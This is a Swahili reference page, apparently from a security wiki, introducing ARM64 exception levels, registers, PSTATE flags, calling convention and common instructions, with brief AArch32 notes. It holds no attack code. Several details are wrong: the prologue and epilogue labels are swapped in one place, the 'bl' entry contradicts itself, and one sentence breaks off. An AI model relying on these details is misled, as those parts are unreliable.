# Utangulizi kwa ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Ngazi za Istisnahi - EL (ARM64v8)**

Katika usanifu wa ARMv8, viwango vya utekelezaji vinavyojulikana kama Exception Levels (ELs) vinaelezea kiwango cha ruhusa na uwezo wa mazingira ya utekelezaji. Kuna ngazi nne za isipokuwa, kuanzia EL0 hadi EL3, kila moja ikifanya kazi tofauti:

1. **EL0 - User Mode**:
- Hii ni ngazi yenye ruhusa ndogo kabisa na hutumika kwa kutekeleza msimbo wa kawaida wa programu.
- Programu zinazoendesha katika EL0 zimetengwa kutoka kwa kila mmoja na kutoka kwa programu za mfumo, zikiboresha usalama na uthabiti.
2. **EL1 - Operating System Kernel Mode**:
- Mifumo mingi ya kernel ya operating system inaendesha kwa ngazi hii.
- EL1 ina ruhusa zaidi kuliko EL0 na inaweza kufikia rasilimali za mfumo, lakini kwa vikwazo fulani ili kuhakikisha uadilifu wa mfumo. Unaenda kutoka EL0 hadi EL1 kwa maagizo ya SVC.
3. **EL2 - Hypervisor Mode**:
- Ngazi hii hutumika kwa uandishi wa virtualisation. Hypervisor unaoendesha katika EL2 unaweza kusimamia mifumo mingi ya uendeshaji (kila mmoja katika EL1 yake) ikifanya kazi kwenye vifaa vya kimwili vinavyofanana.
- EL2 hutoa vipengele vya kutenganisha na kudhibiti mazingira yaliyovirtualishwa.
- Kwa hivyo programu za mashine za virtual kama Parallels zinaweza kutumia `hypervisor.framework` kuingiliana na EL2 na kuendesha mashine za virtual bila kuhitaji kernel extensions.
- Kwa kuhamia kutoka EL1 hadi EL2 hutumika maagizo `HVC`.
4. **EL3 - Secure Monitor Mode**:
- Hii ni ngazi yenye ruhusa zaidi na mara nyingi hutumika kwa secure booting na trusted execution environments.
- EL3 inaweza kusimamia na kudhibiti ufikiaji kati ya hali za secure na non-secure (k.m. secure boot, trusted OS, n.k.).
- Ilitumika kwa KPP (Kernel Patch Protection) katika macOS, lakini haijatumika tena.
- EL3 haisitumiki tena na Apple.
- Uhamisho kwenda EL3 kwa kawaida hufanyika kwa kutumia maagizo `SMC` (Secure Monitor Call).

Matumizi ya ngazi hizi yanaruhusu njia iliyo na muundo na salama ya kusimamia nyanja tofauti za mfumo, kutoka kwa programu za mtumiaji hadi programu za mfumo zenye ruhusa zaidi. Mbinu ya ARMv8 kwa viwango vya ruhusa husaidia kutenganisha kwa ufanisi vipengele tofauti vya mfumo, hivyo kuboresha usalama na uimara wa mfumo.

## **Rejista (ARM64v8)**

ARM64 ina **rejista 31 za madhumuni ya jumla**, zilizoandikwa `x0` hadi `x30`. Kila moja inaweza kuhifadhi thamani ya **64-bit** (byte 8). Kwa operesheni zinazohitaji thamani za 32-bit pekee, rejista zile zile zinaweza kufikiwa katika hali ya 32-bit kutumia majina `w0` hadi `w30`.

1. **`x0`** hadi **`x7`** - Hizi kwa kawaida hutumika kama rejista za muda (scratch) na kwa kupitisha vigezo kwa subroutines.
- **`x0`** pia hubeba data ya kurudi ya function
2. **`x8`** - Katika kernel ya Linux, `x8` hutumika kama nambari ya system call kwa ajili ya maagizo ya `svc`. **Katika macOS x16 ndiye anayetumika!**
3. **`x9`** hadi **`x15`** - Rejista zaidi za muda, mara nyingi zikitumika kwa vigezo vya ndani (local variables).
4. **`x16`** na **`x17`** - **Intra-procedural Call Registers**. Rejista za muda kwa thamani za papo hapo. Zinatumika pia kwa miito isiyo ya moja kwa moja ya function na PLT (Procedure Linkage Table) stubs.
- **`x16`** hutumika kama **nambari ya system call** kwa maagizo ya **`svc`** katika **macOS**.
5. **`x18`** - **Platform register**. Inaweza kutumika kama rejista ya madhumuni ya jumla, lakini kwenye baadhi ya majukwaa, rejista hii imehifadhiwa kwa matumizi maalum ya jukwaa: Pointer kwa current thread environment block katika Windows, au kuonyesha structure ya task inayotekelezwa sasa katika kernel ya Linux.
6. **`x19`** hadi **`x28`** - Hizi ni rejista zinazohifadhiwa na callee. Function lazima ihifadhi thamani za rejista hizi kwa caller wake, hivyo zinahifadhiwa kwenye stack na kurejeshwa kabla ya kurudi kwa caller.
7. **`x29`** - **Frame pointer** ili kufuatilia fremu ya stack. Wakati fremu mpya ya stack inaundwa kwa sababu function inaitwa, rejista **`x29`** inahifadhiwa kwenye stack na anwani ya fremu **mpya** (anwani ya **`sp`**) inawekwa katika rejista hii.
- Rejista hii pia inaweza kutumika kama **rejista ya madhumuni ya jumla** ingawa kwa kawaida hutumika kama rejeleo kwa **vigezo vya ndani**.
8. **`x30`** au **`lr`** - **Link register**. Inabeba **anwani ya kurudi** wakati maagizo `BL` (Branch with Link) au `BLR` (Branch with Link to Register) yatekelezwa kwa kuhifadhi thamani ya **`pc`** katika rejista hii.
- Inaweza pia kutumika kama rejista nyingine yoyote.
- Ikiwa function ya sasa itaita function mpya na hivyo kuandika juu `lr`, itahifadhi `lr` kwenye stack mwanzoni, hii ni epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Hifadhi `fp` na `lr`, tengeneza nafasi na pata `fp` mpya) na kuirejesha mwishoni, hii ni prologue (`ldp x29, x30, [sp], #48; ret` -> Rejesha `fp` na `lr` na rudi).
9. **`sp`** - **Stack pointer**, inatumika kufuatilia kilele cha stack.
- thamani ya **`sp`** inapaswa kuhifadhiwa ikiwa ni angalau **quadword** kwa **alignment** au kosa la alignment linaweza kutokea.
10. **`pc`** - **Program counter**, ambayo inaonyesha kuelekea maagizo yanayofuata. Rejista hii inaweza kusasishwa tu kupitia uzalishaji wa exceptions, kurudi kwa exception, na branches. Maagizo ya kawaida pekee yanayoweza kusoma rejista hii ni branch with link instructions (BL, BLR) ili kuhifadhi anwani ya **`pc`** katika **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Pia inaitwa **`wzr`** katika fomu yake ya rejista ya **32**-bit. Inaweza kutumika kupata thamani sifuri kwa urahisi (operesheni ya kawaida) au kufanya comparisons kwa kutumia **`subs`** kama **`subs XZR, Xn, #10`** bila kuhifadhi data iliyopatikana (katika **`xzr`**).

Rejista za **`Wn`** ni toleo la **32bit** la rejista za **`Xn`**.

> [!TIP]
> Rejista kutoka X0 - X18 ni volatile, ambayo inamaanisha thamani zao zinaweza kubadilishwa kwa miito ya function na interrupts. Hata hivyo, rejista kutoka X19 - X28 ni non-volatile, yaani thamani zao lazima zihifadhiwe kuvuka miito ya function ("callee saved").

### Rejista za SIMD na Floating-Point

Zaidi yake, kuna rejista nyingine **32 za urefu 128bit** ambazo zinaweza kutumika katika operesheni zilizoboreshwa za single instruction multiple data (SIMD) na kwa kufanya arithmetic ya floating-point. Hizi zinaitwa rejista Vn ingawa zinaweza pia kufanya kazi kwa **64**-bit, **32**-bit, **16**-bit na **8**-bit na wakati huo zinaitwa **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** na **`Bn`**.

### Rejista za Mfumo

**Kuna mamia ya rejista za mfumo**, pia zinazoitwa special-purpose registers (SPRs), zinazotumika kwa **kuangalia** na **kudhibiti** tabia za **processors**.\
Zinaweza kusomwa au kuwekwa tu kwa kutumia maagizo maalum **`mrs`** na **`msr`**.

Rejista maalum **`TPIDR_EL0`** na **`TPIDDR_EL0`** mara nyingi hupatikana wakati wa reversing engineering. Kiambishi `EL0` kinaonyesha isipokuwa ya chini zaidi kutoka ambayo rejista inaweza kupatikana (kesi hii EL0 ni ngazi ya kawaida ya isipokuwa ambapo programu za kawaida zinaendesha).\
Mara nyingi hutumika kuhifadhi **anwani ya msingi ya thread-local storage** sehemu ya kumbukumbu. Kwa kawaida kwanza inaweza kusomwa na kuandikwa kwa programu zinazoendesha katika EL0, lakini ya pili inaweza kusomwa kutoka EL0 na kuandikwa kutoka EL1 (kama kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** ina vipengele kadhaa vya mchakato vilivyosanifishwa ndani ya rejista maalum inayoonekana kwa operating-system **`SPSR_ELx`**, ambapo X ni **ngazi ya ruhusa** ya isipokuwa iliyochochewa (hii inaruhusu kurejesha hali ya mchakato wakati isipokuwa inapomalizika).\
Hivi ni sehemu zinazopatikana:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Bendera za hali za masharti **`N`**, **`Z`**, **`C`** na **`V`**:
- **`N`** ina maana operesheni ilizalisha matokeo hasi
- **`Z`** ina maana operesheni ilizalisha sifuri
- **`C`** ina maana operesheni ilibeba (carry)
- **`V`** ina maana operesheni ilizalisha overflow ya signed:
- Jumla ya nambari mbili chanya inaweza kuleta matokeo hasi.
- Jumla ya nambari mbili hasi inaweza kuleta matokeo chanya.
- Katika utofauti, wakati nambari hasi kubwa inatolewa kutoka kwa nambari chanya ndogo (au kinyume), na matokeo hayawezi kuwakilishwa ndani ya wigo wa ukubwa wa bit uliotolewa.
- Bila shaka processor hajui ikiwa operesheni ni signed au la, hivyo itachek agu C na V katika operesheni na kuonyesha kama carry ilitokea kwa kesi ya kuwa ilikuwa signed au unsigned.

> [!WARNING]
> Si maagizo yote yanasasisha bendera hizi. Baadhi kama **`CMP`** au **`TST`** yanafanya hivyo, na mengine yenye kirai s kama **`ADDS`** pia hufanya.

- Bendera ya **upana wa rejista (`nRW`)**: Ikiwa bendera ina thamani 0, programu itaendesha katika hali ya utekelezaji ya AArch64 mara inaporejeshwa.
- Ngazi ya sasa ya **Exception (`EL`)**: Programu ya kawaida inayoendesha katika EL0 itakuwa na thamani 0
- Bendera ya **single stepping (`SS`)**: Inatumika na debuggers kwa kufanya single step kwa kuweka bendera SS kuwa 1 ndani ya **`SPSR_ELx`** kupitia isipokuwa. Programu itaendesha hatua moja na kutoa isipokuwa ya single step.
- Bendera ya **illegal exception (`IL`)**: Inatumika kuashiria wakati software yenye ruhusa inafanya uhamisho usio halali wa ngazi ya isipokuwa, bendera hii imewekwa 1 na processor itatoa isipokuwa ya illegal state.
- Bendera za **`DAIF`**: Bendera hizi zinamruhusu programu yenye ruhusa kuchuja kwa uchaguzi isipokuwa fulani za nje.
- Ikiwa **`A`** ni 1 ina maana **asynchronous aborts** zitaletwa. **`I`** huweka jinsi ya kujibu Requests za Interrupts za Hardware za nje (IRQs). na F inahusiana na **Fast Interrupt Requests** (FIRs).
- Bendera za **kuchagua stack pointer (`SPS`)**: Programu zenye ruhusa zinazoendesha katika EL1 na juu zinaweza kubadilisha kati ya kutumia rejista yao ya stack pointer na ya mtindo wa mtumiaji (k.m. kati ya `SP_EL1` na `EL0`). Mbadala hii inafanywa kwa kuandika kwenye rejista maalum ya **`SPSel`**. Hii haiwezi kufanywa kutoka EL0.

## **Calling Convention (ARM64v8)**

Convention ya miito ya ARM64 inaelekeza kwamba **vigezo nane vya kwanza** kwa function hupitishwa kwenye rejista **`x0` hadi `x7`**. Vigezo **za ziada** hupitishwa kwenye **stack**. Thamani ya **kurudi** inarejeshwa katika rejista **`x0`**, au pia katika **`x1`** ikiwa ni **128 bits** ndefu. Rejista **`x19`** hadi **`x30`** na **`sp`** zinapaswa **kuhifadhiwa** kuvuka miito ya function.

Wakati unasoma function katika assembly, tazama **prologue na epilogue** ya function. **Prologue** kwa kawaida inahusisha **kuhifadhi frame pointer (`x29`)**, **kuweka** frame pointer **mpya**, na **kutenga nafasi kwenye stack**. **Epilogue** kwa kawaida inahusisha **kurejesha frame pointer iliyohifadhiwa** na **kurudi** kutoka function.

### Calling Convention katika Swift

Swift ina **calling convention** yake ambayo inaweza kupatikana katika [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Maagizo ya Kawaida (ARM64v8)**

Maagizo ya ARM64 kwa ujumla yana muundo wa **`opcode dst, src1, src2`**, ambapo **`opcode`** ni **operesheni** itakayotekelezwa (kama `add`, `sub`, `mov`, n.k.), **`dst`** ni rejista ya **destination** ambapo matokeo yatahifadhiwa, na **`src1`** na **`src2`** ni rejista za **source**. Thamani za mara moja (immediate) pia zinaweza kutumika badala ya rejista za source.

- **`mov`**: **Hamisha** thamani kutoka rejista moja kwenda nyingine.
- Mfano: `mov x0, x1` — Hii inahamisha thamani kutoka `x1` kwenda `x0`.
- **`ldr`**: **Pakia** thamani kutoka **kumbukumbu** kwa **rejista**.
- Mfano: `ldr x0, [x1]` — Hii inapakia thamani kutoka eneo la kumbukumbu linaloelekezwa na `x1` ndani ya `x0`.
- **Offset mode**: Offset inayoathiri pointer ya asili inaonyeshwa, kwa mfano:
- `ldr x2, [x1, #8]`, hii itapakia kwenye x2 thamani kutoka x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, hii itapakia kwenye x2 kitu kutoka kwenye array x0, kutoka nafasi x1 (index) * 4
- **Pre-indexed mode**: Hii itafanya hesabu kwenye chanzo, ipate matokeo na pia kuhifadhi chanzo kipya.
- `ldr x2, [x1, #8]!`, hii itapakia `x1 + 8` katika `x2` na kuhifadhi katika x1 matokeo ya `x1 + 8`
- `str lr, [sp, #-4]!`, Hifadhi link register kwenye sp na sasisha rejista sp
- **Post-index mode**: Hii ni kama ile ya awali lakini anwani ya kumbukumbu inapatikana kwanza kisha offset inahesabiwa na kuhifadhiwa.
- `ldr x0, [x1], #8`, pakua `x1` ndani ya `x0` na sasisha x1 kwa `x1 + 8`
- **PC-relative addressing**: Katika kesi hii anwani ya kupakia inahesabiwa kuhusiana na rejista ya PC
- `ldr x1, =_start`, Hii itapakia anwani ambapo alama `_start` inaanza ndani ya x1 kuhusiana na PC ya sasa.
- **`str`**: **Hifadhi** thamani kutoka **rejista** kwenda **kumbukumbu**.
- Mfano: `str x0, [x1]` — Hii inahifadhi thamani ya `x0` kwenye eneo la kumbukumbu linaloelekezwa na `x1`.
- **`ldp`**: **Load Pair of Registers**. Amri hii **inapakia rejista mbili** kutoka **mikoa ya kumbukumbu mfululizo**. Anwani ya kumbukumbu kwa kawaida inaundwa kwa kuongeza offset kwa thamani katika rejista nyingine.
- Mfano: `ldp x0, x1, [x2]` — Hii inapakia `x0` na `x1` kutoka kwenye maeneo ya kumbukumbu katika `x2` na `x2 + 8`, mtawaliwa.
- **`stp`**: **Store Pair of Registers**. Amri hii **inahifadhi rejista mbili** kwa **mikoa ya kumbukumbu mfululizo**. Anwani ya kumbukumbu kwa kawaida inaundwa kwa kuongeza offset kwa thamani katika rejista nyingine.
- Mfano: `stp x0, x1, [sp]` — Hii inahifadhi `x0` na `x1` kwenye maeneo ya kumbukumbu `sp` na `sp + 8`, mtawaliwa.
- `stp x0, x1, [sp, #16]!` — Hii inahifadhi `x0` na `x1` kwenye maeneo ya kumbukumbu `sp+16` na `sp + 24`, mtawaliwa, na inasasisha `sp` kwa `sp+16`.
- **`add`**: **Ongeza** thamani za rejista mbili na hifadhi matokeo katika rejista.
- Sintaksia: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (rejista au immediate)
- \[shift #N | RRX] -> Fanya shift au tumia RRX
- Mfano: `add x0, x1, x2` — Hii inaongeza thamani katika `x1` na `x2` pamoja na kuhifadhi matokeo katika `x0`.
- `add x5, x5, #1, lsl #12` — Hii ni sawa na 4096 (1 ikipandishwa mara 12) -> 1 0000 0000 0000 0000
- **`adds`** Hii hufanya `add` na kusasisha bendera
- **`sub`**: **Toa** thamani za rejista mbili na hifadhi matokeo katika rejista.
- Angalia **sintaksia ya `add`**.
- Mfano: `sub x0, x1, x2` — Hii inatoa thamani ya `x2` kutoka `x1` na kuhifadhi matokeo katika `x0`.
- **`subs`** Hii ni kama sub lakini ikisasisha bendera
- **`mul`**: **Zidisha** thamani za **rejista mbili** na hifadhi matokeo katika rejista.
- Mfano: `mul x0, x1, x2` — Hii inazidisha thamani za `x1` na `x2` na kuhifadhi matokeo katika `x0`.
- **`div`**: **Gawa** thamani ya rejista moja kwa nyingine na hifadhi matokeo katika rejista.
- Mfano: `div x0, x1, x2` — Hii inagawa thamani ya `x1` kwa `x2` na kuhifadhi matokeo katika `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Ongeza 0s mwishoni ukienda mbele bit nyingine (kuzidisha kwa mara n)
- **Logical shift right**: Ongeza 0s mwanzoni ukienda nyuma bit nyingine (kugawa kwa mara n katika unsigned)
- **Arithmetic shift right**: Kama **`lsr`**, lakini badala ya kuongeza 0s ikiwa bit inayofuata ni 1, **1s zinaongezwa** (gawa kwa mara n katika signed)
- **Rotate right**: Kama **`lsr`** lakini kile kinachondolewa kutoka kulia kinambatishwa kushoto
- **Rotate Right with Extend**: Kama **`ror`**, lakini kwa kutumia bendera ya carry kama "most significant bit". Hivyo bendera ya carry inahamishwa kuwa bit 31 na bit iliyotolewa kwenda bendera ya carry.
- **`bfm`**: **Bit Filed Move**, operesheni hizi **huelekeza nakala ya bits `0...n`** kutoka kwa thamani na kuzihami katika nafasi **`m..m+n`**. **`#s`** inaonyesha **nafasi ya bit ya kushoto** na **`#r`** ni kiasi cha kuzungusha kulia.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Nakili bitfield kutoka rejista na kuiweka katika rejista nyingine.
- **`BFI X1, X2, #3, #4`** Weka bits 4 kutoka X2 kutoka bit ya 3 ya X1
- **`BFXIL X1, X2, #3, #4`** Chukua kutoka bit 3 ya X2 bits nne na ziweke kwenye X1
- **`SBFIZ X1, X2, #3, #4`** Inapanua kwa sign bits 4 kutoka X2 na kuitia ndani X1 kuanzia nafasi ya bit 3 ukifuta bits za kulia
- **`SBFX X1, X2, #3, #4`** Inachukua bits 4 kuanzia bit 3 kutoka X2, inapanua kwa sign, na kuiweka matokeo ndani ya X1
- **`UBFIZ X1, X2, #3, #4`** Inapanua kwa zero bits 4 kutoka X2 na kuziweka ndani X1 kuanzia nafasi ya bit 3 ukifuta bits za kulia
- **`UBFX X1, X2, #3, #4`** Inachukua bits 4 kuanzia bit 3 kutoka X2 na kuiweka matokeo yaliyopanuliwa kwa zero ndani ya X1.
- **Sign Extend To X:** Inapanua sign (au kuongeza 0s katika toleo la unsigned) ya thamani ili iweze kutumika katika operesheni:
- **`SXTB X1, W2`** Inapanua sign ya byte **kutoka W2 hadi X1** (`W2` ni nusu ya `X2`) ili kujaza 64bits
- **`SXTH X1, W2`** Inapanua sign ya nambari ya 16bit **kutoka W2 hadi X1** ili kujaza 64bits
- **`SXTW X1, W2`** Inapanua sign ya byte **kutoka W2 hadi X1** ili kujaza 64bits
- **`UXTB X1, W2`** Inaongeza 0s (unsigned) kwa byte **kutoka W2 hadi X1** ili kujaza 64bits
- **`extr`:** Inachukua bits kutoka kwa jozi ya rejista zilizounganishwa.
- Mfano: `EXTR W3, W2, W1, #3` Hii itachanganya W1+W2 na kupata kuanzia bit 3 ya W2 hadi bit 3 ya W1 na kuihifadhi ndani ya W3.
- **`cmp`**: **Linganisha** rejista mbili na kuweka bendera za masharti. Ni **alias ya `subs`** ikizuia rejista ya destination kuwa zero register. Inafaa kujua kama `m == n`.
- Inasaidia **sintaksia ile ile kama `subs`**
- Mfano: `cmp x0, x1` — Hii inalinganisha thamani katika `x0` na `x1` na kuweka bendera za masharti ipasavyo.
- **`cmn`**: **Linganisho la negative** operand. Katika kesi hii ni **alias ya `adds`** na inaunga mkono sintaksia ile ile. Inafaa kujua kama `m == -n`.
- **`ccmp`**: Linganisho la masharti, ni kulinganisha kunakofanywa tu ikiwa linganisho la awali lilikuwa kweli na hasa litaset bendera nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> ikiwa x1 != x2 na x3 < x4, ruka kwenda func
- Hii ni kwa sababu **`ccmp`** itatekelezwa tu ikiwa **`cmp`** ya awali ilikuwa `NE`, ikiwa haikuwa hivyo bits `nzcv` zitasetwa kuwa 0 (ambayo haitafanikisha ulinganifu wa `blt`).
- Hii pia inaweza kutumika kama `ccmn` (sawa lakini negative, kama `cmp` vs `cmn`).
- **`tst`**: Inachunguza ikiwa yoyote ya thamani za kulinganisha ni 1 (inafanya kazi kama ANDS bila kuhifadhi matokeo mahali popote). Inafaa kuangalia rejista dhidi ya thamani na kuangalia ikiwa bit yoyote ya rejista iliyotajwa ndani ya thamani ni 1.
- Mfano: `tst X1, #7` Angalia ikiwa yoyote ya bits 3 za mwisho za X1 ni 1
- **`teq`**: Operesheni XOR ikituliza matokeo
- **`b`**: Branch isiyo na masharti
- Mfano: `b myFunction`
- Kumbuka hii haitajaza link register na anwani ya kurudi (si nzuri kwa miito ya subroutine zinazotakiwa kurudi)
- **`bl`**: **Branch** na link, inatumika **kuitwa** kwa **subroutine**. Inahifadhi **anwani ya kurudi katika `x30`**.
- Mfano: `bl myFunction` — Hii inaita function `myFunction` na kuhifadhi anwani ya kurudi katika `x30`.
- Kumbuka hii haitajaza link register na anwani ya kurudi (si nzuri kwa subrutine zinazotakiwa kurudi)
- **`blr`**: **Branch** na Link kwa Rejista, inatumika **kuitwa** kwa **subroutine** ambapo lengwa ameainishwa ndani ya **rejista**. Inahifadhi anwani ya kurudi katika `x30`. (Hii ni
- Mfano: `blr x1` — Hii inaita function ambayo anwani yake iko ndani ya `x1` na kuhifadhi anwani ya kurudi katika `x30`.
- **`ret`**: **Rudi** kutoka **subroutine**, kwa kawaida ukitumia anwani katika **`x30`**.
- Mfano: `ret` — Hii inarudi kutoka subroutine ya sasa ikitumia anwani ya kurudi katika `x30`.
- **`b.<cond>`**: Branch za masharti
- **`b.eq`**: **Ruka ikiwa sawa**, kulingana na amri ya `cmp` iliyopita.
- Mfano: `b.eq label` — Ikiwa amri ya `cmp` iliyopita ilikuta thamani mbili sawa, hii inaruka kwenda `label`.
- **`b.ne`**: **Ruka ikiwa si sawa**. Amri hii inakagua bendera za masharti (zilizo setiwa na amri ya comparison ya awali), na ikiwa thamani zililinganiswa zilikosekana, inaruka kwenda label au anwani.
- Mfano: Baada ya amri `cmp x0, x1`, `b.ne label` — Ikiwa thamani katika `x0` na `x1` hazikuwa sawa, hii inaruka kwenda `label`.
- **`cbz`**: **Compare and Branch on Zero**. Amri hii inalinganisha rejista na sifuri, na ikiwa zinafanana, inaruka kwenda label au anwani.
- Mfano: `cbz x0, label` — Ikiwa thamani kwenye `x0` ni sifuri, hii inaruka kwenda `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Amri hii inalinganisha rejista na sifuri, na ikiwa hazifanani, inaruka kwenda label au anwani.
- Mfano: `cbnz x0, label` — Ikiwa thamani kwenye `x0` si sifuri, hii inaruka kwenda `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Mfano: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Mfano: `tbz x0, #8, label`
- **Operesheni za kuchagua za masharti (Conditional select operations)**: Hizi ni operesheni ambapo tabia yake inatofautiana kulingana na bendera za masharti.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ikiwa kweli, X0 = X1, ikiwa si kweli, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = Xn, ikiwa si kweli, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Ikiwa kweli, Xd = Xn + 1, ikiwa si kweli, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = Xn, ikiwa si, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Ikiwa kweli, Xd = NOT(Xn), ikiwa si, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = Xn, ikiwa si, Xd = - Xm
- `cneg Xd, Xn, cond` -> Ikiwa kweli, Xd = - Xn, ikiwa si, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = 1, ikiwa si, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Ikiwa kweli, Xd = \<all 1>, ikiwa si, Xd = 0
- **`adrp`**: Hesabu anwani ya ukurasa wa alama na kuihifadhi katika rejista.
- Mfano: `adrp x0, symbol` — Hii inahesabu anwani ya ukurasa wa `symbol` na kuihifadhi katika `x0`.
- **`ldrsw`**: **Pakia** thamani iliyosainiwa ya **32-bit** kutoka kumbukumbu na **kuipanua kwa sign hadi 64** bits. Hii hutumika kwa kesi za SWITCH zinazotumika mara nyingi.
- Mfano: `ldrsw x0, [x1]` — Hii inapakia thamani ya 32-bit iliyosainiwa kutoka eneo la kumbukumbu linaloelekezwa na `x1`, kuipanua kwa sign hadi 64 bits, na kuihifadhi ndani ya `x0`.
- **`stur`**: **Hifadhi** thamani ya rejista kwenye eneo la kumbukumbu, ukitumia offset kutoka rejista nyingine.
- Mfano: `stur x0, [x1, #4]` — Hii inahifadhi thamani ya `x0` kwenye anwani ya kumbukumbu ambayo ni byte 4 kubwa kuliko anwani iliyopo sasa katika `x1`.
- **`svc`** : Fanya **system call**. Inasimama kwa "Supervisor Call". Wakati processor inatekeleza amri hii, **inabadilisha kutoka user mode kwenda kernel mode** na kuruka kwenye eneo maalum la kumbukumbu ambapo **msimbo wa kushughulikia system call wa kernel** upo.

- Mfano:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Hifadhi link register na frame pointer kwenye stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Sanidi kiashiria kipya cha fremu**: `mov x29, sp` (huweka kiashiria kipya cha fremu kwa ajili ya kazi ya sasa)
3. **Tenga nafasi kwenye stack kwa vigezo vya ndani** (ikiwa inahitajika): `sub sp, sp, <size>` (ambapo `<size>` ni idadi ya bytes zinazohitajika)

### **Epilogi ya function**

1. **Toa nafasi ya vigezo vya ndani (ikiwa zilitengewa)**: `add sp, sp, <size>`
2. **Rejesha link register na kiashiria cha fremu**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (inarudisha udhibiti kwa muite kwa kutumia anwani iliyopo kwenye registri ya kiungo)

## Ulinzi wa Kumbukumbu wa Kawaida wa ARM

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## Hali ya Utekelezaji ya AARCH32

Armv8-A inaunga mkono utekelezaji wa programu za 32-bit. **AArch32** inaweza kuendesha katika mojawapo ya **seti mbili za maagizo**: **`A32`** na **`T32`** na inaweza kubadili kati yao kupitia **`interworking`**.\
Programu za 64-bit zilizo na ruhusa za juu zinaweza kupanga utekelezaji wa programu za **32-bit** kwa kutekeleza uhamisho wa kiwango cha exception kwenda 32-bit yenye ruhusa za chini.\
Kumbuka kuwa mabadiliko kutoka 64-bit hadi 32-bit yanatokea kwa kiwango cha exception cha chini (kwa mfano programu ya 64-bit katika EL1 ikianzisha programu katika EL0). Hii hufanywa kwa kuweka **bit 4 ya** **`SPSR_ELx`** registri maalum **iwe 1** wakati thread ya mchakato wa `AArch32` iko tayari kutekelezwa na sehemu iliyobaki ya `SPSR_ELx` inahifadhi CPSR ya programu za **`AArch32`**. Kisha, mchakato mwenye ruhusa huita instruksi ya **`ERET`** ili processor ibadilike hadi **`AArch32`**, ikaingia katika A32 au T32 kulingana na CPSR.

The **`interworking`** hutokea kwa kutumia bits J na T za CPSR. `J=0` na `T=0` ina maana **`A32`** na `J=0` na `T=1` ina maana **T32**. Hii kawaida inamaanisha kuweka **bit ndogo kabisa kuwa 1** kuonyesha kuwa seti ya maagizo ni T32.\
Hii inasetwa wakati wa **maagizo ya tawi ya interworking,** lakini pia inaweza kuwekwa moja kwa moja na maagizo mengine wakati PC imewekwa kama registri ya lengo. Mfano:

Mfano mwingine:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Rejista

Kuna rejista 16 za 32-bit (r0-r15). **From r0 to r14** zinaweza kutumika kwa **kazi yoyote**, hata hivyo baadhi yao kawaida zinahifadhiwa:

- **`r15`**: kaunta ya programu (daima). Inabeba anwani ya agizo lijalo. Katika A32 current + 8, katika T32, current + 4.
- **`r11`**: Kiashiria cha fremu
- **`r12`**: rejista ya wito la ndani la taratibu
- **`r13`**: Kiashiria cha stack (Kumbuka stack daima imepangwa kwa ulinganifu wa 16-byte)
- **`r14`**: Rejista ya kiungo

Zaidi ya hayo, rejista zinahifadhiwa katika **`banked registries`**. Ambayo ni maeneo yanayohifadhi thamani za rejista na kuruhusu kufanya **fast context switching** wakati wa kushughulikia exception na operesheni zilizo na vibali ili kuepuka hitaji la kuhifadhi na kurejesha rejista kwa mikono kila wakati.\
Hii hufanywa kwa **kuhifadhi hali ya processor kutoka `CPSR` hadi `SPSR`** ya mode ya processor ambayo exception imetumwa. Katika kurudisha exception, **`CPSR`** inarejeshwa kutoka kwa **`SPSR`**.

### CPSR - Rejista ya Hali ya Programu ya Sasa

Katika AArch32 CPSR inafanya kazi sawa na **`PSTATE`** katika AArch64 na pia huhifadhiwa katika **`SPSR_ELx`** wakati exception inachukuliwa ili kurejesha utekelezaji baadaye:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Sehemu zimegawanywa katika makundi yafuatayo:

- Application Program Status Register (APSR): Bendera za kihesabu na zinapatikana kutoka EL0
- Execution State Registers: Tabia ya mchakato (inasimamiwa na OS).

#### Application Program Status Register (APSR)

